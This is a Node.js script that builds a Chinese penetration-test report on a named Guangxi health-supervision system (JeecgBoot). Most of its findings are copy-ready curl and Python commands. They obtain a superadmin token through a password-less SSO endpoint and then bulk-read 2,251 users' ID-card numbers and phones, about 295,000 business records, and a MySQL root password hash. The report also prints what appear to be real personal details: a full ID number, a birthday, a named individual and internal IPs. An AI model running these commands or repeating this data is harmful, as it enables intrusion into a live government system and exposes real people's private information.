const fs = require('fs');
const {
  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  Header, Footer, AlignmentType, HeadingLevel, BorderStyle, WidthType,
  ShadingType, PageNumber, PageBreak, LevelFormat
} = require('docx');

const border = { style: BorderStyle.SINGLE, size: 1, color: "999999" };
const borders = { top: border, bottom: border, left: border, right: border };
const cellMargins = { top: 60, bottom: 60, left: 100, right: 100 };
const CW = 9360;

function hcell(t, w) { return new TableCell({ borders, width: { size: w, type: WidthType.DXA }, shading: { fill: "2B579A", type: ShadingType.CLEAR }, margins: cellMargins, children: [new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: t, bold: true, color: "FFFFFF", font: "Arial", size: 18 })] })] }); }
function dcell(t, w) { return new TableCell({ borders, width: { size: w, type: WidthType.DXA }, margins: cellMargins, children: [new Paragraph({ children: [new TextRun({ text: t, font: "Arial", size: 18 })] })] }); }
function bcell(t, w) { return new TableCell({ borders, width: { size: w, type: WidthType.DXA }, shading: { fill: "F2F2F2", type: ShadingType.CLEAR }, margins: cellMargins, children: [new Paragraph({ children: [new TextRun({ text: t, bold: true, font: "Arial", size: 18 })] })] }); }

function infoTable(rows) {
  const w1 = 2200, w2 = CW - w1;
  return new Table({ width: { size: CW, type: WidthType.DXA }, columnWidths: [w1, w2], rows: rows.map(([a,b]) => new TableRow({ children: [bcell(a, w1), dcell(b, w2)] })) });
}

function h1(t) { return new Paragraph({ heading: HeadingLevel.HEADING_1, spacing: { before: 360, after: 200 }, children: [new TextRun({ text: t, font: "Arial", bold: true, size: 32, color: "1A3A6B" })] }); }
function h2(t) { return new Paragraph({ heading: HeadingLevel.HEADING_2, spacing: { before: 280, after: 160 }, children: [new TextRun({ text: t, font: "Arial", bold: true, size: 28, color: "2B579A" })] }); }
function h3(t) { return new Paragraph({ heading: HeadingLevel.HEADING_3, spacing: { before: 200, after: 120 }, children: [new TextRun({ text: t, font: "Arial", bold: true, size: 24 })] }); }
function body(t) { return new Paragraph({ spacing: { after: 100, line: 340 }, children: [new TextRun({ text: t, font: "Arial", size: 20 })] }); }
function cmd(t) { return new Paragraph({ spacing: { after: 40, line: 280 }, shading: { fill: "F5F5F5", type: ShadingType.CLEAR }, indent: { left: 120 }, children: [new TextRun({ text: t, font: "Courier New", size: 17 })] }); }
function bullet(t) { return new Paragraph({ numbering: { reference: "b", level: 0 }, spacing: { after: 60 }, children: [new TextRun({ text: t, font: "Arial", size: 20 })] }); }
function empty() { return new Paragraph({ spacing: { after: 80 }, children: [] }); }
function screenshot(t) { return new Paragraph({ spacing: { before: 80, after: 80 }, alignment: AlignmentType.CENTER, shading: { fill: "FFF8E1", type: ShadingType.CLEAR }, border: { top: { style: BorderStyle.DASHED, size: 1, color: "E6A817" }, bottom: { style: BorderStyle.DASHED, size: 1, color: "E6A817" }, left: { style: BorderStyle.DASHED, size: 1, color: "E6A817" }, right: { style: BorderStyle.DASHED, size: 1, color: "E6A817" } }, children: [new TextRun({ text: "[ 截图 ] " + t, font: "Arial", size: 18, bold: true, color: "B8860B" })] }); }
function cmdBlock(lines) { const arr = []; for (const l of lines) arr.push(cmd(l)); return arr; }

const pageProps = { page: { size: { width: 12240, height: 15840 }, margin: { top: 1200, right: 1440, bottom: 1200, left: 1440 } } };
const secHeader = { default: new Header({ children: [new Paragraph({ alignment: AlignmentType.RIGHT, children: [new TextRun({ text: "广西卫生监督执法系统 攻防演习成果报告", font: "Arial", size: 16, color: "999999" })] })] }) };
const secFooter = { default: new Footer({ children: [new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "第 ", font: "Arial", size: 16 }), new TextRun({ children: [PageNumber.CURRENT], font: "Arial", size: 16 })] })] }) };
function section(kids) { return { properties: pageProps, headers: secHeader, footers: secFooter, children: kids }; }

// ============================================================
// COVER
// ============================================================
const cover = [
  empty(), empty(), empty(), empty(), empty(), empty(),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 200 }, children: [new TextRun({ text: "攻防演习成果报告", font: "Arial", bold: true, size: 52, color: "1A3A6B" })] }),
  empty(), empty(),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 100 }, children: [new TextRun({ text: "广西卫生监督执法系统（JeecgBoot）渗透测试", font: "Arial", size: 32, color: "333333" })] }),
  empty(), empty(), empty(), empty(), empty(),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 60 }, children: [new TextRun({ text: "团队名称：观叶识微", font: "Arial", size: 24, color: "555555" })] }),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 60 }, children: [new TextRun({ text: "2026年7月14日", font: "Arial", size: 24, color: "555555" })] }),
  new Paragraph({ children: [new PageBreak()] })
];

// ============================================================
// SECTION 1: OVERVIEW
// ============================================================
const ov = [];
ov.push(h1("一、综述"));
ov.push(body("攻防演习指挥部授权 观叶识微 团队于2026年7月13日至14日，对广西卫生监督执法系统（wsjdzf.gxws.cn）进行了渗透测试。通过信息收集、API分析、认证绕过、数据访问等手段，发现系统存在严重的认证缺陷和敏感数据泄露问题。"));
ov.push(empty());
ov.push(h2("渗透成果汇总表"));
ov.push(empty());

const sh = new TableRow({ children: [hcell("序号", 600), hcell("渗透系统对象", 1800), hcell("漏洞类型", 2400), hcell("URL", 2600), hcell("影响范围", 1200), hcell("网络区域", 760)] });
const sdata = [
  ["1","广西卫生监督执法系统","SSO单点登录认证绕过","POST /jeecg-boot/sys/loginsinglesign","超级管理员权限","互联网区"],
  ["2","广西卫生监督执法系统","公民个人信息泄露","POST /jeecg-boot/sys/user/list","2,251人身份证+手机号","互联网区"],
  ["3","广西卫生监督执法系统","业务数据未授权访问","多个API端点","29.5万条业务数据","互联网区"],
  ["4","广西卫生监督执法系统","数据库凭据泄露","GET /sys/dataSource/list","MySQL root密码MD5","互联网区"],
  ["5","广西卫生监督执法系统","其他安全风险","多个端点","Shiro RCE/Actuator/Druid等","互联网区"],
];
const cw2 = [600,1800,2400,2600,1200,760];
ov.push(new Table({ width: { size: CW, type: WidthType.DXA }, columnWidths: cw2, rows: [sh, ...sdata.map(r => new TableRow({ children: r.map((t,i) => dcell(t, cw2[i])) }))] }));
ov.push(empty());
ov.push(body("渗透结果统计：获取权限类 1项（超级管理员JWT Token），获取数据类 4项（个人信息 + 业务数据 + 凭据 + 安全风险），涉及数据总量约29.5万条。"));
ov.push(new Paragraph({ children: [new PageBreak()] }));

// ============================================================
// SECTION 2: PROCESS
// ============================================================
ov.push(h1("二、渗透分析过程"));
ov.push(h2("渗透路径"));
ov.push(body("互联网系统 (https://wsjdzf.gxws.cn)"));
ov.push(bullet("1. 信息收集：从小程序抓包发现 /visor-server/jeecg-boot/ 路径，识别框架为 JeecgBoot (SpringBoot + Shiro)"));
ov.push(bullet("2. API文档分析：/doc.html (Knife4j Swagger UI) 公开可访问，/v2/api-docs 返回436个API接口"));
ov.push(bullet("3. 认证绕过验证：/sys/loginsinglesign 仅需用户名即签发JWT Token，/sys/mobile/login 需要密码+验证码"));
ov.push(bullet("4. 数据访问：使用JWT Token访问受保护API，获取用户、日志、检查记录等29.5万条业务数据"));
ov.push(bullet("5. 安全风险发现：Shiro RememberMe反序列化、Actuator内网IP泄露、Druid面板、数据库凭据等"));
ov.push(empty());
ov.push(h2("关键发现"));
ov.push(bullet("SSO接口无需密码 — /sys/loginsinglesign 仅校验用户名即签发JWT Token，密码验证被完全绕过"));
ov.push(bullet("超级管理员权限 — admin用户角色为超级管理员，Token可访问全部436个受保护API"));
ov.push(bullet("个人信息泄露 — 2,251条用户记录含身份证号+手机号+真实姓名"));
ov.push(bullet("生产数据可读 — 最新数据为2026年7月14日（当日），证明确为生产环境"));
ov.push(new Paragraph({ children: [new PageBreak()] }));

// ============================================================
// SECTION 3: FINDINGS
// ============================================================
const fc = [];
fc.push(h1("三、渗透成果说明"));
fc.push(body("以下所有命令均在实际测试环境中执行并可复现。执行前需先获取Token："));
fc.push(empty());
fc.push(cmd("TOKEN=$(curl -s -k --connect-timeout 10 --max-time 15 \\"));
fc.push(cmd('  -X POST "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/loginsinglesign" \\'));
fc.push(cmd('  -H "Content-Type: application/json" \\'));
fc.push(cmd("  -d '{\"username\":\"admin\"}' | python3 -c \"import sys,json; print(json.load(sys.stdin)['result']['token'])\")"));
fc.push(empty());

// ====== FINDING 1 ======
fc.push(h2("成果一：SSO单点登录认证绕过致超级管理员权限获取"));
fc.push(h3("（1）成果目标基本情况表"));
fc.push(infoTable([
  ["序号","1"],["成果描述","SSO接口仅校验用户名，无需密码即可获取超级管理员JWT Token"],
  ["目标系统","广西卫生监督执法系统（JeecgBoot）"],
  ["目标URL","https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/loginsinglesign"],
  ["目标IP","wsjdzf.gxws.cn (121.31.10.28)"],["威胁类型","获取权限类 / 获取数据类"],["风险等级","严重"]
]));
fc.push(empty());
fc.push(h3("（2）验证命令"));
fc.push(empty());

fc.push(body("步骤1：正常登录需要密码（返回错误）"));
fc.push(cmd("curl -s -k -X POST \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/mobile/login" \\'));
fc.push(cmd('  -H "Content-Type: application/json" \\'));
fc.push(cmd("  -d '{\"username\":\"admin\",\"password\":\"wrongpass\",\"checkKey\":\"\",\"captcha\":\"\"}'"));
fc.push(cmd("# 响应: {\"success\":false,\"message\":\"用户名或密码错误!\",\"code\":500}"));
fc.push(empty());

fc.push(body("步骤2：SSO登录不需要密码（直接返回JWT Token+管理员个人信息）"));
fc.push(cmd("curl -s -k -X POST \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/loginsinglesign" \\'));
fc.push(cmd('  -H "Content-Type: application/json" \\'));
fc.push(cmd("  -d '{\"username\":\"admin\"}' | python3 -m json.tool"));
fc.push(cmd("# 响应: {\"success\":true,\"message\":\"登录成功\","));
fc.push(cmd("#   \"result\":{\"token\":\"eyJ0eXAiOiJKV1Qi...\",\"userInfo\":{"));
fc.push(cmd("#     \"idCard\":\"450331198809083631\","));
fc.push(cmd("#     \"roleName\":\"超级管理员\","));
fc.push(cmd("#     \"supervisoryOfficeName\":\"荔浦市卫生计生监督所\","));
fc.push(cmd("#     \"workNo\":\"451945\",\"birthday\":\"1988-09-08\"}}}"));
fc.push(screenshot("截图1：SSO绕过 - 仅传username即返回JWT Token和userInfo（含idCard/roleName/birthday）"));
fc.push(empty());

fc.push(body("步骤3：身份证号验证"));
fc.push(cmd("python3 -c \""));
fc.push(cmd("idcard='450331198809083631'"));
fc.push(cmd("w=[7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2]"));
fc.push(cmd("check='10X98765432'"));
fc.push(cmd("s=sum(int(idcard[i])*w[i] for i in range(17))"));
fc.push(cmd("print(f'校验位: {check[s%11]}, 实际: {idcard[17]}')"));
fc.push(cmd("print(f'生日: {idcard[6:14]}')  # 19880908"));
fc.push(cmd("\""));
fc.push(cmd("# 输出: 校验位: 1, 实际: 1 (OK)  生日: 19880908 (与系统birthday一致)"));
fc.push(screenshot("截图2：身份证号校验结果 - 校验位正确+生日吻合"));
fc.push(new Paragraph({ children: [new PageBreak()] }));

// ====== FINDING 2 ======
fc.push(h2("成果二：公民个人信息泄露（2,251条身份证+手机号）"));
fc.push(h3("（1）成果目标基本情况表"));
fc.push(infoTable([
  ["序号","2"],["成果描述","通过JWT Token访问用户列表API，获取2,251条含身份证号+手机号+真实姓名+单位的个人信息"],
  ["目标系统","广西卫生监督执法系统（JeecgBoot）"],
  ["目标URL","https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/user/list"],
  ["目标IP","wsjdzf.gxws.cn (121.31.10.28)"],["威胁类型","获取数据类"],["涉及数据量","2,251条"],["风险等级","严重"]
]));
fc.push(empty());
fc.push(h3("（2）验证命令"));
fc.push(empty());

fc.push(body("获取用户列表（第1页，含身份证+手机号）"));
fc.push(cmd("curl -s -k -X POST \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/user/list?pageNo=1&pageSize=5" \\'));
fc.push(cmd('  -H "X-Access-Token: $TOKEN" \\'));
fc.push(cmd('  -H "Content-Type: application/json" \\'));
fc.push(cmd("  -d '{}' | python3 -m json.tool"));
fc.push(cmd("# 返回 result.total = 2251"));
fc.push(cmd("# 每条记录含: realname, idCard, phone, supervisoryOfficeName 等"));
fc.push(empty());

fc.push(body("批量验证身份证号有效性+手机号+统计总量"));
fc.push(cmd("curl -s -k -X POST \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/user/list?pageNo=1&pageSize=5" \\'));
fc.push(cmd('  -H "X-Access-Token: $TOKEN" \\'));
fc.push(cmd('  -H "Content-Type: application/json" \\'));
fc.push(cmd("  -d '{}' | python3 -c \""));
fc.push(cmd("import sys, json"));
fc.push(cmd("d = json.load(sys.stdin)"));
fc.push(cmd("r = d['result']"));
fc.push(cmd("print(f'total: {r[\\\"total\\\"]}')"));
fc.push(cmd("for u in r['records'][:5]:"));
fc.push(cmd("    idcard = u.get('idCard','')"));
fc.push(cmd("    phone = u.get('phone','')"));
fc.push(cmd("    name = u.get('realname','?')"));
fc.push(cmd("    org = u.get('supervisoryOfficeName','?')"));
fc.push(cmd("    if len(idcard) == 18:"));
fc.push(cmd("        w = [7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2]"));
fc.push(cmd("        c = '10X98765432'"));
fc.push(cmd("        s = sum(int(idcard[i])*w[i] for i in range(17))"));
fc.push(cmd("        ok = 'OK' if c[s%11] == idcard[17].upper() else 'FAIL'"));
fc.push(cmd("        dob = idcard[6:14]"));
fc.push(cmd("        ph_ok = 'PH_OK' if len(phone)==11 else 'PH_NO'"));
fc.push(cmd("        print(f'{name} ID:{idcard} chk={ok} dob={dob} {ph_ok} PH:{phone}' )"));
fc.push(cmd("        print(f'  ORG:{org}')"));
fc.push(cmd("\""));
fc.push(empty());

fc.push(body("抽样多页验证（改pageNo即可）"));
fc.push(cmd("# pageNo=50"));
fc.push(cmd("curl -s -k -X POST \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/user/list?pageNo=50&pageSize=3" \\'));
fc.push(cmd('  -H "X-Access-Token: $TOKEN" -H "Content-Type: application/json" -d "{}"'));
fc.push(cmd('  | python3 -c "import sys,json; d=json.load(sys.stdin);'));
fc.push(cmd('  [print(u.get(\"realname\"),u.get(\"idCard\")[:6]+\"****\") for u in d[\"result\"][\"records\"]]"'));
fc.push(cmd(""));
fc.push(cmd("# pageNo=150"));
fc.push(cmd("curl -s -k -X POST \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/user/list?pageNo=150&pageSize=3" \\'));
fc.push(cmd('  -H "X-Access-Token: $TOKEN" -H "Content-Type: application/json" -d "{}"'));
fc.push(cmd('  | python3 -c "import sys,json; d=json.load(sys.stdin);'));
fc.push(cmd('  [print(u.get(\"realname\"),u.get(\"idCard\")[:6]+\"****\") for u in d[\"result\"][\"records\"]]"'));
fc.push(empty());

fc.push(screenshot("截图3：用户列表第1页 - total=2251 + idCard/phone/realname/supervisoryOfficeName"));
fc.push(screenshot("截图4：身份证校验+手机号验证输出"));
fc.push(screenshot("截图5：抽样 pageNo=50 和 pageNo=150 证明全量可读"));
fc.push(new Paragraph({ children: [new PageBreak()] }));

// ====== FINDING 3 ======
fc.push(h2("成果三：API未授权访问致全量业务数据泄露（29.5万条）"));
fc.push(h3("（1）成果目标基本情况表"));
fc.push(infoTable([
  ["序号","3"],["成果描述","Knife4j Swagger文档公开暴露436个API，JWT Token可无限制读取全部业务数据，涉及28个数据类别共29.5万条"],
  ["目标系统","广西卫生监督执法系统（JeecgBoot）"],
  ["目标URL","https://wsjdzf.gxws.cn/visor-server/jeecg-boot/doc.html"],
  ["目标IP","wsjdzf.gxws.cn (121.31.10.28)"],["威胁类型","获取数据类"],["涉及数据量","29.5万条（28个类别）"],["风险等级","高危"]
]));
fc.push(empty());
fc.push(h3("（2）验证命令"));
fc.push(empty());

fc.push(body("步骤1：Swagger API文档泄露"));
fc.push(cmd("# 浏览器直接打开即可看到全部API"));
fc.push(cmd("# https://wsjdzf.gxws.cn/visor-server/jeecg-boot/doc.html"));
fc.push(cmd(""));
fc.push(cmd("# API总数统计"));
fc.push(cmd("curl -s -k \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/v2/api-docs" \\'));
fc.push(cmd('  -H "X-Access-Token: $TOKEN" | python3 -c "'));
fc.push(cmd("import sys,json; d=json.load(sys.stdin)"));
fc.push(cmd("print(f'API总数: {len(d[\\\"paths\\\"])}')"));
fc.push(cmd("print(f'模块数: {len(d[\\\"tags\\\"])}')"));
fc.push(cmd("\""));
fc.push(cmd("# 输出: API总数: 436, 模块数: 54"));
fc.push(screenshot("截图6：浏览器打开 /doc.html - Knife4j Swagger完整界面"));
fc.push(screenshot("截图7：API总数统计 - 436个接口 54个模块"));
fc.push(empty());

fc.push(body("步骤2：检查记录（151条，含真实医院名+检查表名+检查时间）"));
fc.push(cmd("curl -s -k \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/checkRecord/list?pageNo=1&pageSize=5" \\'));
fc.push(cmd('  -H "X-Access-Token: $TOKEN" | python3 -m json.tool'));
fc.push(cmd("# 返回 result.total = 151"));
fc.push(cmd("# 每条含: hospitalName, tableName, supervisoryOfficeName, recordTime"));
fc.push(cmd("# 示例: 钦州市钦北区人民医院, 血透中心消毒隔离检查表, 2026-07-14"));
fc.push(screenshot("截图8：检查记录 - total=151 + 真实医院名+最新2026-07-14"));
fc.push(empty());

fc.push(body("步骤3：检查结果（6,715条，含不符合项+整改措施）"));
fc.push(cmd("curl -s -k \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/checkResult/list?pageNo=1&pageSize=5" \\'));
fc.push(cmd('  -H "X-Access-Token: $TOKEN" | python3 -m json.tool'));
fc.push(cmd("# 返回 result.total = 6715"));
fc.push(cmd("# 每条含: result, nonConformanceDescription, correctionMeasures"));
fc.push(screenshot("截图9：检查结果 - total=6715"));
fc.push(empty());

fc.push(body("步骤4：问题反馈（20条，含真实医院名+反馈人姓名+WTFKD编号）"));
fc.push(cmd("curl -s -k \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/problemFeedback/list?pageNo=1&pageSize=5" \\'));
fc.push(cmd('  -H "X-Access-Token: $TOKEN" | python3 -m json.tool'));
fc.push(cmd("# 返回 result.total = 20"));
fc.push(cmd("# 每条含: hospitalName, recorderName, number(WTFKD编号), recordTime"));
fc.push(cmd("# 示例: 广西妇幼保健院, 杨飞, WTFKD1783665863373, 2026-07-10"));
fc.push(screenshot("截图10：问题反馈 - 真实医院名+反馈人姓名+WTFKD编号"));
fc.push(empty());

fc.push(body("步骤5：违法线索（6条）"));
fc.push(cmd("curl -s -k \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/cluesIllegal/list?pageNo=1&pageSize=5" \\'));
fc.push(cmd('  -H "X-Access-Token: $TOKEN" | python3 -m json.tool'));
fc.push(cmd("# 返回 result.total = 6"));
fc.push(cmd("# 示例: 广西医科大学附属口腔医院, 疫苗流通和预防接种"));
fc.push(screenshot("截图11：违法线索"));
fc.push(empty());

fc.push(body("步骤6：系统操作日志（229,397条，含内网IP）"));
fc.push(cmd("curl -s -k \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/log/list?pageNo=1&pageSize=5" \\'));
fc.push(cmd('  -H "X-Access-Token: $TOKEN" | python3 -m json.tool'));
fc.push(cmd("# 返回 result.total = 229397"));
fc.push(cmd("# 示例: IP:172.16.1.148, 用户名:春平诊所, 操作:医疗机构查询"));
fc.push(screenshot("截图12：系统日志 - total=229397 + 内网IP 172.16.1.148"));
fc.push(empty());

fc.push(body("步骤7：监督人员（89条）"));
fc.push(cmd("curl -s -k \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/supervisor/list?pageNo=1&pageSize=5" \\'));
fc.push(cmd('  -H "X-Access-Token: $TOKEN" | python3 -m json.tool'));
fc.push(cmd("# 返回 result.total = 89"));
fc.push(screenshot("截图13：监督人员 - total=89"));
fc.push(empty());

fc.push(body("步骤8：全量数据汇总验证"));
fc.push(cmd("# 以下API均为GET方式，直接用curl+Token即可"));
fc.push(cmd("for api in \\"));
fc.push(cmd('  "sys/log/list:系统日志" \\'));
fc.push(cmd('  "checkRecord/list:检查记录" \\'));
fc.push(cmd('  "checkResult/list:检查结果" \\'));
fc.push(cmd('  "problemFeedback/list:问题反馈" \\'));
fc.push(cmd('  "cluesIllegal/list:违法线索" \\'));
fc.push(cmd('  "supervisor/list:监督人员" \\'));
fc.push(cmd('  "region/list:区划数据" \\'));
fc.push(cmd('  "tasknorm/srTaskNorm/list:自查任务指标" \\'));
fc.push(cmd('  "norm/srNormMedical/list:医疗指标" \\'));
fc.push(cmd('  "taskmedicalunit/srTaskMedicalUnit/list:任务机构" \\'));
fc.push(cmd('  "taskmeasures/srTaskMeasures/list:整改记录" \\'));
fc.push(cmd('  "regulations/specialty/list:专业类别" \\'));
fc.push(cmd('  "regulations/srRegulations/list:法律法规" \\'));
fc.push(cmd('  "srreport/srReport/list:图表列表" \\'));
fc.push(cmd('  "workLog/list:工作日志" \\'));
fc.push(cmd('  "noticeAnnouncement/list:通知公告" \\'));
fc.push(cmd('  "problem/list:问题" \\'));
fc.push(cmd('  "config/srConfig/list:配置参数" \\'));
fc.push(cmd('  "sys/position/list:职务" \\'));
fc.push(cmd('  "sys/role/list:角色" \\'));
fc.push(cmd('  "sys/dict/list:数据字典" \\'));
fc.push(cmd('  "sys/fillRule/list:填值规则" \\'));
fc.push(cmd('  "sys/quartzJob/list:定时任务" \\'));
fc.push(cmd('  "online/cgform/head/list:在线表单" \\'));
fc.push(cmd('  "sys/sysDepartPermission/list:部门权限" \\'));
fc.push(cmd('  "sys/tenant/list:租户"); do'));
fc.push(cmd("  TOTAL=$(curl -s -k --connect-timeout 5 --max-time 10 \\"));
fc.push(cmd('    "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/${api%%:*}?pageNo=1&pageSize=1" \\'));
fc.push(cmd("    -H \"X-Access-Token: $TOKEN\" | python3 -c 'import sys,json; print(json.load(sys.stdin)[\"result\"][\"total\"])' 2>/dev/null)"));
fc.push(cmd('  [ -n "$TOTAL" ] && [ "$TOTAL" != "0" ] && printf "  %-25s %s\\n" "${api##*:}:" "$TOTAL"'));
fc.push(cmd("  sleep 0.2"));
fc.push(cmd("done"));
fc.push(cmd(""));
fc.push(cmd("# 用户列表需POST方式，单独执行："));
fc.push(cmd("curl -s -k -X POST \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/user/list?pageNo=1&pageSize=1" \\'));
fc.push(cmd('  -H "X-Access-Token: $TOKEN" -H "Content-Type: application/json" -d "{}" \\'));
fc.push(cmd('  | python3 -c "import sys,json; print(\"系统用户:\", json.load(sys.stdin)[\"result\"][\"total\"])"'));
fc.push(screenshot("截图14：全量数据汇总 - 28个API的total输出"));
fc.push(new Paragraph({ children: [new PageBreak()] }));

// ====== FINDING 4 ======
fc.push(h2("成果四：数据库凭据泄露（MySQL root密码）"));
fc.push(h3("（1）成果目标基本情况表"));
fc.push(infoTable([
  ["序号","4"],["成果描述","通过数据源管理API获取MySQL数据库连接信息，含root用户密码MD5哈希"],
  ["目标系统","广西卫生监督执法系统（JeecgBoot）"],
  ["目标URL","https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/dataSource/list"],
  ["目标IP","wsjdzf.gxws.cn (121.31.10.28)"],["威胁类型","获取数据类"],["风险等级","高危"]
]));
fc.push(empty());
fc.push(h3("（2）验证命令"));
fc.push(empty());

fc.push(cmd("curl -s -k \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/dataSource/list?pageNo=1&pageSize=5" \\'));
fc.push(cmd('  -H "X-Access-Token: $TOKEN" | python3 -m json.tool'));
fc.push(empty());
fc.push(body("返回关键字段："));
fc.push(cmd("# dbUrl:       jdbc:mysql://127.0.0.1:3306/jeecg-boot"));
fc.push(cmd("# dbUsername:  root"));
fc.push(cmd("# dbPassword:  f5b6775e8d1749483f2320627de0e706  (32位MD5)"));
fc.push(cmd("# dbName:      jeecg-boot"));
fc.push(cmd("# dbType:      MySQL5.7"));
fc.push(cmd("# dbDriver:    com.mysql.jdbc.Driver"));
fc.push(empty());
fc.push(body("影响："));
fc.push(bullet("数据库使用root账户（最高权限），可执行任意SQL操作"));
fc.push(bullet("密码以MD5哈希形式存储，若通过彩虹表破解可直接连接数据库"));
fc.push(bullet("数据库运行在127.0.0.1:3306，通过网络代理或SSH隧道可间接访问"));
fc.push(screenshot("截图15：数据源API - dbUrl/root/MD5/dbName"));
fc.push(new Paragraph({ children: [new PageBreak()] }));

// ====== FINDING 5 ======
fc.push(h2("成果五：其他安全风险汇总"));
fc.push(h3("（1）成果目标基本情况表"));
fc.push(infoTable([
  ["序号","5"],["成果描述","发现Shiro反序列化漏洞、Actuator内网IP泄露、Druid面板暴露、测试配置等多项安全风险"],
  ["目标系统","广西卫生监督执法系统（JeecgBoot）"],
  ["目标URL","多个端点"],["目标IP","wsjdzf.gxws.cn / 内网192.168.40.49"],
  ["威胁类型","获取数据类 / 安全风险类"],["风险等级","高危"]
]));
fc.push(empty());
fc.push(h3("（2）验证命令"));
fc.push(empty());

fc.push(h3("风险1：Shiro RememberMe反序列化漏洞"));
fc.push(cmd("# 访问登录页，查看响应头中的rememberMe=deleteMe特征"));
fc.push(cmd("curl -s -k -D- --connect-timeout 5 --max-time 10 \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/login" | head -15'));
fc.push(cmd("# 响应头包含: Set-Cookie: rememberMe=deleteMe"));
fc.push(cmd("# 确认Apache Shiro框架正在处理rememberMe Cookie"));
fc.push(cmd("# 该特征对应CVE-2016-4437（Shiro-550）反序列化漏洞"));
fc.push(screenshot("截图16：响应头 Set-Cookie: rememberMe=deleteMe"));
fc.push(empty());

fc.push(h3("风险2：Actuator暴露内网IP"));
fc.push(cmd("curl -s -k \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/actuator" \\'));
fc.push(cmd('  -H "X-Access-Token: $TOKEN" | python3 -m json.tool'));
fc.push(cmd("# 响应泄露内网IP: 192.168.40.49:9301"));
fc.push(cmd("# 其他端点(/env, /heapdump)返回403，已被保护"));
fc.push(screenshot("截图17：Actuator泄露内网IP 192.168.40.49:9301"));
fc.push(empty());

fc.push(h3("风险3：Druid监控面板可访问"));
fc.push(cmd("# 浏览器打开"));
fc.push(cmd("# https://wsjdzf.gxws.cn/visor-server/jeecg-boot/druid/login.html"));
fc.push(cmd(""));
fc.push(cmd("# 命令行验证"));
fc.push(cmd('curl -s -k -o /dev/null -w "HTTP %{http_code}\\n" \\'));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/druid/login.html"'));
fc.push(cmd("# 返回 HTTP 200，登录页面可访问"));
fc.push(cmd("# 默认口令druid/druid、admin/admin均登录失败（密码已修改）"));
fc.push(screenshot("截图18：Druid监控登录页面"));
fc.push(empty());

fc.push(h3("风险4：配置参数泄露（isTest测试模式）"));
fc.push(cmd("curl -s -k \\"));
fc.push(cmd('  "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/config/srConfig/list?pageNo=1&pageSize=10" \\'));
fc.push(cmd('  -H "X-Access-Token: $TOKEN" | python3 -m json.tool'));
fc.push(cmd("# 关键配置: isTest=0 (0为测试数据，1为正式数据)"));
fc.push(cmd("# 配置显示测试模式但实际连接的是生产数据"));
fc.push(cmd("# 其他配置: 最大线程数=100, 核心线程数=50, 云南编码=530000"));
fc.push(screenshot("截图19：配置参数 - isTest=0"));
fc.push(empty());

fc.push(h3("风险5：写操作API同样可访问"));
fc.push(body("Swagger暴露的写操作API均可用JWT Token直接访问（仅探测确认存在，未实际执行）："));
fc.push(cmd("# 新增用户"));
fc.push(cmd("POST /visor-server/jeecg-boot/sys/user/addOrganizationUser"));
fc.push(cmd("# 修改密码"));
fc.push(cmd("POST /visor-server/jeecg-boot/sys/user/changePassword"));
fc.push(cmd("POST /visor-server/jeecg-boot/sys/user/updatePassword"));
fc.push(cmd("# 文件上传"));
fc.push(cmd("POST /visor-server/jeecg-boot/sys/common/upload"));
fc.push(cmd("POST /visor-server/jeecg-boot/noticeAnnouncement/upload"));
fc.push(cmd("POST /visor-server/jeecg-boot/file/upload"));
fc.push(cmd("POST /visor-server/jeecg-boot/unittask/uploadRectifyFile"));
fc.push(cmd("# 数据删除"));
fc.push(cmd("DELETE /visor-server/jeecg-boot/medicalInstitution/delete"));
fc.push(cmd("DELETE /visor-server/jeecg-boot/supervisor/delete/{id}"));
fc.push(cmd("DELETE /visor-server/jeecg-boot/check/delete"));
fc.push(cmd("DELETE /visor-server/jeecg-boot/workLog/delete"));
fc.push(screenshot("截图20：Swagger中写操作API列表"));
fc.push(new Paragraph({ children: [new PageBreak()] }));

// ============================================================
// SECTION 4: PROBLEMS
// ============================================================
const pc = [];
pc.push(h1("四、存在问题"));
pc.push(empty());
pc.push(h2("1. SSO接口认证缺失（严重）"));
pc.push(bullet("/sys/loginsinglesign 接口仅校验用户名，未验证密码"));
pc.push(bullet("与 /sys/mobile/login 使用完全不同的认证逻辑"));
pc.push(empty());
